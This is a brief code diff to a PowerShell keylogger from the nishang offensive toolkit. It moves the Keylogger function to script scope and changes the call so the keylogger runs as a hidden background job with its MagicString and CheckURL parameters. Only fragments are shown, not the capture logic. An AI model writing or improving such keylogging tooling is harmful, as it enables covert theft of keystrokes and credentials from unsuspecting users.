@@ -116,7 +116,7 @@ https://github.com/samratashok/nishang
 
 $functions =  {
 
-function Keylogger
+function script:Keylogger
 {
     Param ( 
         [Parameter(Position = 0, Mandatory = $True)]
@@ -383,6 +383,6 @@ function Keylogger
         }
         else
         {
-            Keylogger $MagicString $CheckURL
+            start-job -InitializationScript $functions -scriptblock {Keylogger $args[0] $args[1]} -ArgumentList @($MagicString,$CheckURL)
         }
     }
